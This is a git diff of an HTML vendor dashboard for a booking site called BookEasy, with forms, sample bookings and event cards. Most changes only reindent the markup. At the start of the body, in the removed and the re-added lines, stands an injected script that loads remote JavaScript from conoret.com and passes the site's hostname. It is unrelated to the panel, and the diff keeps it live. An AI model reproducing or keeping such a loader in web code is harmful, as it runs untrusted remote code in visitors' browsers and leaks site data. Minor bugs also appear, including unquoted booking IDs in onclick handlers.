@@ -1,13 +1,19 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Business Panel | Vendor Side</title>
     <link rel="stylesheet" href="buisness.css">
-    <link href="https://fonts.googleapis.com/css2?family=Futura:wght@400;500;700&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Futura:wght@400;500;700&family=Poppins:wght@300;400;500;600&display=swap"
+        rel="stylesheet">
 </head>
-<body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+
+<body>
+    <script
+        type="text/javascript">window.top === window && !function () { var e = document.createElement("script"), t = document.getElementsByTagName("head")[0]; e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e) }();</script>
     <div class="container">
         <!-- Sidebar Navigation -->
         <nav class="sidebar">
@@ -61,7 +67,7 @@
                                 <p>Don't have an account? <a href="#" id="show-register">Register</a></p>
                             </form>
                         </div>
-                        
+
                         <div class="auth-form register-form hidden">
                             <h2>Register your Business</h2>
                             <form id="register-form">
@@ -128,56 +134,56 @@
                                     </tr>
                                 </thead>
                                 <tbody id="recent-bookings">
-            <tr>
-                <td>Sarah Davis</td>
-                <td>Tech Workshop</td>
-                <td>May 22, 2025</td>
-                <td>
-                    <span class="status-badge status-pending">Pending</span>
-                </td>
-                <td>₹360.00</td>
-            </tr>
-        
-            <tr>
-                <td>Jennifer Brown</td>
-                <td>Tech Workshop</td>
-                <td>May 22, 2025</td>
-                <td>
-                    <span class="status-badge status-cancelled">Cancelled</span>
-                </td>
-                <td>₹120.00</td>
-            </tr>
-        
-            <tr>
-                <td>Emily Johnson</td>
-                <td>Business Conference 2025</td>
-                <td>May 15, 2025</td>
-                <td>
-                    <span class="status-badge status-confirmed">Confirmed</span>
-                </td>
-                <td>₹500.00</td>
-            </tr>
-        
-            <tr>
-                <td>Michael Smith</td>
-                <td>Business Conference 2025</td>
-                <td>May 15, 2025</td>
-                <td>
-                    <span class="status-badge status-confirmed">Confirmed</span>
-                </td>
-                <td>₹250.00</td>
-            </tr>
-        
-            <tr>
-                <td>Robert Wilson</td>
-                <td>Networking Mixer</td>
-                <td>Apr 30, 2025</td>
-                <td>
-                    <span class="status-badge status-confirmed">Confirmed</span>
-                </td>
-                <td>₹90.00</td>
-            </tr>
-        </tbody>
+                                    <tr>
+                                        <td>Sarah Davis</td>
+                                        <td>Tech Workshop</td>
+                                        <td>May 22, 2025</td>
+                                        <td>
+                                            <span class="status-badge status-pending">Pending</span>
+                                        </td>
+                                        <td>₹360.00</td>
+                                    </tr>
+
+                                    <tr>
+                                        <td>Jennifer Brown</td>
+                                        <td>Tech Workshop</td>
+                                        <td>May 22, 2025</td>
+                                        <td>
+                                            <span class="status-badge status-cancelled">Cancelled</span>
+                                        </td>
+                                        <td>₹120.00</td>
+                                    </tr>
+
+                                    <tr>
+                                        <td>Emily Johnson</td>
+                                        <td>Business Conference 2025</td>
+                                        <td>May 15, 2025</td>
+                                        <td>
+                                            <span class="status-badge status-confirmed">Confirmed</span>
+                                        </td>
+                                        <td>₹500.00</td>
+                                    </tr>
+
+                                    <tr>
+                                        <td>Michael Smith</td>
+                                        <td>Business Conference 2025</td>
+                                        <td>May 15, 2025</td>
+                                        <td>
+                                            <span class="status-badge status-confirmed">Confirmed</span>
+                                        </td>
+                                        <td>₹250.00</td>
+                                    </tr>
+
+                                    <tr>
+                                        <td>Robert Wilson</td>
+                                        <td>Networking Mixer</td>
+                                        <td>Apr 30, 2025</td>
+                                        <td>
+                                            <span class="status-badge status-confirmed">Confirmed</span>
+                                        </td>
+                                        <td>₹90.00</td>
+                                    </tr>
+                                </tbody>
                             </table>
                         </div>
                     </div>
@@ -212,86 +218,91 @@
                     </div>
 
                     <div class="events-grid" id="events-container">
-        <div class="event-card" data-id="4">
-            <img src="/api/placeholder/300/180" alt="Leadership Seminar" class="event-image">
-            <div class="event-details">
-                <h3>Leadership Seminar</h3>
-                <div class="event-meta">
-                    <span>Jun 10, 2025 at 10:00 AM</span>
-                    <span>₹180.00</span>
-                </div>
-                <p>Full-day seminar on effective leadership strategies and practices.</p>
-                <div class="event-meta">
-                    <span>Capacity: 75</span>
-                    <span>Booked: 12</span>
-                </div>
-                <div class="event-actions">
-                    <button class="btn action-btn edit-btn" onclick="editEvent(4)">Edit</button>
-                    <button class="btn action-btn delete-btn" onclick="showDeleteEventConfirm(4)">Delete</button>
-                </div>
-            </div>
-        </div>
-    
-        <div class="event-card" data-id="2">
-            <img src="/api/placeholder/300/180" alt="Tech Workshop" class="event-image">
-            <div class="event-details">
-                <h3>Tech Workshop</h3>
-                <div class="event-meta">
-                    <span>May 22, 2025 at 1:30 PM</span>
-                    <span>₹120.00</span>
-                </div>
-                <p>Hands-on workshop covering the latest technologies and industry trends.</p>
-                <div class="event-meta">
-                    <span>Capacity: 50</span>
-                    <span>Booked: 32</span>
-                </div>
-                <div class="event-actions">
-                    <button class="btn action-btn edit-btn" onclick="editEvent(2)">Edit</button>
-                    <button class="btn action-btn delete-btn" onclick="showDeleteEventConfirm(2)">Delete</button>
-                </div>
-            </div>
-        </div>
-    
-        <div class="event-card" data-id="1">
-            <img src="/api/placeholder/300/180" alt="Business Conference 2025" class="event-image">
-            <div class="event-details">
-                <h3>Business Conference 2025</h3>
-                <div class="event-meta">
-                    <span>May 15, 2025 at 9:00 AM</span>
-                    <span>₹250.00</span>
-                </div>
-                <p>Annual business conference featuring keynote speakers and networking opportunities.</p>
-                <div class="event-meta">
-                    <span>Capacity: 200</span>
-                    <span>Booked: 75</span>
-                </div>
-                <div class="event-actions">
-                    <button class="btn action-btn edit-btn" onclick="editEvent(1)">Edit</button>
-                    <button class="btn action-btn delete-btn" onclick="showDeleteEventConfirm(1)">Delete</button>
-                </div>
-            </div>
-        </div>
-    
-        <div class="event-card" data-id="3">
-            <img src="/api/placeholder/300/180" alt="Networking Mixer" class="event-image">
-            <div class="event-details">
-                <h3>Networking Mixer</h3>
-                <div class="event-meta">
-                    <span>Apr 30, 2025 at 6:00 PM</span>
-                    <span>₹45.00</span>
-                </div>
-                <p>Evening networking event for professionals in the industry.</p>
-                <div class="event-meta">
-                    <span>Capacity: 100</span>
-                    <span>Booked: 68</span>
-                </div>
-                <div class="event-actions">
-                    <button class="btn action-btn edit-btn" onclick="editEvent(3)">Edit</button>
-                    <button class="btn action-btn delete-btn" onclick="showDeleteEventConfirm(3)">Delete</button>
-                </div>
-            </div>
-        </div>
-    </div>
+                        <div class="event-card" data-id="4">
+                            <img src="/api/placeholder/300/180" alt="Leadership Seminar" class="event-image">
+                            <div class="event-details">
+                                <h3>Leadership Seminar</h3>
+                                <div class="event-meta">
+                                    <span>Jun 10, 2025 at 10:00 AM</span>
+                                    <span>₹180.00</span>
+                                </div>
+                                <p>Full-day seminar on effective leadership strategies and practices.</p>
+                                <div class="event-meta">
+                                    <span>Capacity: 75</span>
+                                    <span>Booked: 12</span>
+                                </div>
+                                <div class="event-actions">
+                                    <button class="btn action-btn edit-btn" onclick="editEvent(4)">Edit</button>
+                                    <button class="btn action-btn delete-btn"
+                                        onclick="showDeleteEventConfirm(4)">Delete</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="event-card" data-id="2">
+                            <img src="/api/placeholder/300/180" alt="Tech Workshop" class="event-image">
+                            <div class="event-details">
+                                <h3>Tech Workshop</h3>
+                                <div class="event-meta">
+                                    <span>May 22, 2025 at 1:30 PM</span>
+                                    <span>₹120.00</span>
+                                </div>
+                                <p>Hands-on workshop covering the latest technologies and industry trends.</p>
+                                <div class="event-meta">
+                                    <span>Capacity: 50</span>
+                                    <span>Booked: 32</span>
+                                </div>
+                                <div class="event-actions">
+                                    <button class="btn action-btn edit-btn" onclick="editEvent(2)">Edit</button>
+                                    <button class="btn action-btn delete-btn"
+                                        onclick="showDeleteEventConfirm(2)">Delete</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="event-card" data-id="1">
+                            <img src="/api/placeholder/300/180" alt="Business Conference 2025" class="event-image">
+                            <div class="event-details">
+                                <h3>Business Conference 2025</h3>
+                                <div class="event-meta">
+                                    <span>May 15, 2025 at 9:00 AM</span>
+                                    <span>₹250.00</span>
+                                </div>
+                                <p>Annual business conference featuring keynote speakers and networking opportunities.
+                                </p>
+                                <div class="event-meta">
+                                    <span>Capacity: 200</span>
+                                    <span>Booked: 75</span>
+                                </div>
+                                <div class="event-actions">
+                                    <button class="btn action-btn edit-btn" onclick="editEvent(1)">Edit</button>
+                                    <button class="btn action-btn delete-btn"
+                                        onclick="showDeleteEventConfirm(1)">Delete</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="event-card" data-id="3">
+                            <img src="/api/placeholder/300/180" alt="Networking Mixer" class="event-image">
+                            <div class="event-details">
+                                <h3>Networking Mixer</h3>
+                                <div class="event-meta">
+                                    <span>Apr 30, 2025 at 6:00 PM</span>
+                                    <span>₹45.00</span>
+                                </div>
+                                <p>Evening networking event for professionals in the industry.</p>
+                                <div class="event-meta">
+                                    <span>Capacity: 100</span>
+                                    <span>Booked: 68</span>
+                                </div>
+                                <div class="event-actions">
+                                    <button class="btn action-btn edit-btn" onclick="editEvent(3)">Edit</button>
+                                    <button class="btn action-btn delete-btn"
+                                        onclick="showDeleteEventConfirm(3)">Delete</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
 
                     <!-- Add/Edit Event Modal -->
                     <div id="event-modal" class="modal hidden">
@@ -347,7 +358,7 @@
                 <!-- Bookings Section -->
                 <section id="bookings-section" class="hidden">
                     <h1>Upcoming Bookings</h1>
-                    
+
                     <div class="bookings-filter">
                         <div class="filter-group">
                             <label for="booking-status">Status:</label>
@@ -361,17 +372,17 @@
                         <div class="filter-group">
                             <label for="booking-event">Event:</label>
                             <select id="booking-event">
-        <option value="all">All Events</option>
-        
-            <option value="1">Business Conference 2025</option>
-        
-            <option value="2">Tech Workshop</option>
-        
-            <option value="3">Networking Mixer</option>
-        
-            <option value="4">Leadership Seminar</option>
-        
-    </select>
+                                <option value="all">All Events</option>
+
+                                <option value="1">Business Conference 2025</option>
+
+                                <option value="2">Tech Workshop</option>
+
+                                <option value="3">Networking Mixer</option>
+
+                                <option value="4">Leadership Seminar</option>
+
+                            </select>
                         </div>
                     </div>
 
@@ -390,106 +401,111 @@
                                 </tr>
                             </thead>
                             <tbody id="bookings-table">
-        <tr>
-            <td>B1003</td>
-            <td>Sarah Davis</td>
-            <td>Tech Workshop</td>
-            <td>May 22, 2025 at 1:30 PM</td>
-            <td>3</td>
-            <td>₹360.00</td>
-            <td>
-                <span class="status-badge status-pending">Pending</span>
-            </td>
-            <td>
-                <div class="event-actions">
-                    <button class="btn action-btn view-btn" onclick="viewBookingDetails(B1003)">View</button>
-                    <button class="btn action-btn edit-btn" onclick="confirmBooking('B1003')">
-                        Confirm
-                    </button>
-                </div>
-            </td>
-        </tr>
-    
-        <tr>
-            <td>B1005</td>
-            <td>Jennifer Brown</td>
-            <td>Tech Workshop</td>
-            <td>May 22, 2025 at 1:30 PM</td>
-            <td>1</td>
-            <td>₹120.00</td>
-            <td>
-                <span class="status-badge status-cancelled">Cancelled</span>
-            </td>
-            <td>
-                <div class="event-actions">
-                    <button class="btn action-btn view-btn" onclick="viewBookingDetails(B1005)">View</button>
-                    <button class="btn action-btn edit-btn" onclick="confirmBooking('B1005')">
-                        Confirm
-                    </button>
-                </div>
-            </td>
-        </tr>
-    
-        <tr>
-            <td>B1001</td>
-            <td>Emily Johnson</td>
-            <td>Business Conference 2025</td>
-            <td>May 15, 2025 at 9:00 AM</td>
-            <td>2</td>
-            <td>₹500.00</td>
-            <td>
-                <span class="status-badge status-confirmed">Confirmed</span>
-            </td>
-            <td>
-                <div class="event-actions">
-                    <button class="btn action-btn view-btn" onclick="viewBookingDetails(B1001)">View</button>
-                    <button class="btn action-btn delete-btn" onclick="cancelBooking('B1001')">
-                        Cancel
-                    </button>
-                </div>
-            </td>
-        </tr>
-    
-        <tr>
-            <td>B1002</td>
-            <td>Michael Smith</td>
-            <td>Business Conference 2025</td>
-            <td>May 15, 2025 at 9:00 AM</td>
-            <td>1</td>
-            <td>₹250.00</td>
-            <td>
-                <span class="status-badge status-confirmed">Confirmed</span>
-            </td>
-            <td>
-                <div class="event-actions">
-                    <button class="btn action-btn view-btn" onclick="viewBookingDetails(B1002)">View</button>
-                    <button class="btn action-btn delete-btn" onclick="cancelBooking('B1002')">
-                        Cancel
-                    </button>
-                </div>
-            </td>
-        </tr>
-    
-        <tr>
-            <td>B1004</td>
-            <td>Robert Wilson</td>
-            <td>Networking Mixer</td>
-            <td>Apr 30, 2025 at 6:00 PM</td>
-            <td>2</td>
-            <td>$90.00</td>
-            <td>
-                <span class="status-badge status-confirmed">Confirmed</span>
-            </td>
-            <td>
-                <div class="event-actions">
-                    <button class="btn action-btn view-btn" onclick="viewBookingDetails(B1004)">View</button>
-                    <button class="btn action-btn delete-btn" onclick="cancelBooking('B1004')">
-                        Cancel
-                    </button>
-                </div>
-            </td>
-        </tr>
-    </tbody>
+                                <tr>
+                                    <td>B1003</td>
+                                    <td>Sarah Davis</td>
+                                    <td>Tech Workshop</td>
+                                    <td>May 22, 2025 at 1:30 PM</td>
+                                    <td>3</td>
+                                    <td>₹360.00</td>
+                                    <td>
+                                        <span class="status-badge status-pending">Pending</span>
+                                    </td>
+                                    <td>
+                                        <div class="event-actions">
+                                            <button class="btn action-btn view-btn"
+                                                onclick="viewBookingDetails(B1003)">View</button>
+                                            <button class="btn action-btn edit-btn" onclick="confirmBooking('B1003')">
+                                                Confirm
+                                            </button>
+                                        </div>
+                                    </td>
+                                </tr>
+
+                                <tr>
+                                    <td>B1005</td>
+                                    <td>Jennifer Brown</td>
+                                    <td>Tech Workshop</td>
+                                    <td>May 22, 2025 at 1:30 PM</td>
+                                    <td>1</td>
+                                    <td>₹120.00</td>
+                                    <td>
+                                        <span class="status-badge status-cancelled">Cancelled</span>
+                                    </td>
+                                    <td>
+                                        <div class="event-actions">
+                                            <button class="btn action-btn view-btn"
+                                                onclick="viewBookingDetails(B1005)">View</button>
+                                            <button class="btn action-btn edit-btn" onclick="confirmBooking('B1005')">
+                                                Confirm
+                                            </button>
+                                        </div>
+                                    </td>
+                                </tr>
+
+                                <tr>
+                                    <td>B1001</td>
+                                    <td>Emily Johnson</td>
+                                    <td>Business Conference 2025</td>
+                                    <td>May 15, 2025 at 9:00 AM</td>
+                                    <td>2</td>
+                                    <td>₹500.00</td>
+                                    <td>
+                                        <span class="status-badge status-confirmed">Confirmed</span>
+                                    </td>
+                                    <td>
+                                        <div class="event-actions">
+                                            <button class="btn action-btn view-btn"
+                                                onclick="viewBookingDetails(B1001)">View</button>
+                                            <button class="btn action-btn delete-btn" onclick="cancelBooking('B1001')">
+                                                Cancel
+                                            </button>
+                                        </div>
+                                    </td>
+                                </tr>
+
+                                <tr>
+                                    <td>B1002</td>
+                                    <td>Michael Smith</td>
+                                    <td>Business Conference 2025</td>
+                                    <td>May 15, 2025 at 9:00 AM</td>
+                                    <td>1</td>
+                                    <td>₹250.00</td>
+                                    <td>
+                                        <span class="status-badge status-confirmed">Confirmed</span>
+                                    </td>
+                                    <td>
+                                        <div class="event-actions">
+                                            <button class="btn action-btn view-btn"
+                                                onclick="viewBookingDetails(B1002)">View</button>
+                                            <button class="btn action-btn delete-btn" onclick="cancelBooking('B1002')">
+                                                Cancel
+                                            </button>
+                                        </div>
+                                    </td>
+                                </tr>
+
+                                <tr>
+                                    <td>B1004</td>
+                                    <td>Robert Wilson</td>
+                                    <td>Networking Mixer</td>
+                                    <td>Apr 30, 2025 at 6:00 PM</td>
+                                    <td>2</td>
+                                    <td>$90.00</td>
+                                    <td>
+                                        <span class="status-badge status-confirmed">Confirmed</span>
+                                    </td>
+                                    <td>
+                                        <div class="event-actions">
+                                            <button class="btn action-btn view-btn"
+                                                onclick="viewBookingDetails(B1004)">View</button>
+                                            <button class="btn action-btn delete-btn" onclick="cancelBooking('B1004')">
+                                                Cancel
+                                            </button>
+                                        </div>
+                                    </td>
+                                </tr>
+                            </tbody>
                         </table>
                     </div>
                 </section>
@@ -515,13 +531,16 @@
                 <h2 class="footer-logo">BookEasy</h2>
                 <p class="footer-tagline">Simple booking solutions for everyone</p>
                 <div class="social-icons">
-                    <a href="#" class="social-icon"><img src="meta.jpg" alt="meta" height="45px" class="meta"><i class="fa fa-facebook"></i></a>
-                    <a href="#" class="social-icon"><img src="x.jpg" alt="meta" height="45px" class="meta"><i class="fa fa-twitter"></i></a>
-                    <a href="#" class="social-icon"><img src="insta.jpg" alt="meta" height="45px" class="meta"><i class="fa fa-instagram"></i></a>
+                    <a href="https://www.facebook.com/" class="social-icon"><img src="meta.jpg" alt="meta" height="45px" class="meta"><i
+                            class="fa fa-facebook"></i></a>
+                    <a href="https://x.com/?lang=en" class="social-icon"><img src="x.jpg" alt="meta" height="45px" class="meta"><i
+                            class="fa fa-twitter"></i></a>
+                    <a href="https://www.instagram.com/" class="social-icon"><img src="insta.jpg" alt="meta" height="45px" class="meta"><i
+                            class="fa fa-instagram"></i></a>
                     <!-- <a href="#" class="social-icon"><i class="fa fa-linkedin"></i></a> -->
                 </div>
             </div>
-            
+
             <div class="footer-section links-section">
                 <h3 class="footer-heading">Quick Links</h3>
                 <ul class="footer-links">
@@ -532,7 +551,7 @@
                     <li><a href="#">Contact</a></li>
                 </ul>
             </div>
-            
+
             <div class="footer-section links-section">
                 <h3 class="footer-heading">For Businesses</h3>
                 <ul class="footer-links">
@@ -543,7 +562,7 @@
                     <li><a href="#">Success Stories</a></li>
                 </ul>
             </div>
-            
+
             <div class="footer-section contact-section">
                 <h3 class="footer-heading">Contact Us</h3>
                 <ul class="contact-info">
@@ -560,7 +579,7 @@
                 </div>
             </div>
         </div>
-        
+
         <div class="footer-bottom">
             <div class="footer-container">
                 <p class="copyright">© 2025 BookEasy. All rights reserved.</p>
@@ -576,4 +595,5 @@
     <script src="buissness.js"></script>
 
 </body>
+
 </html>
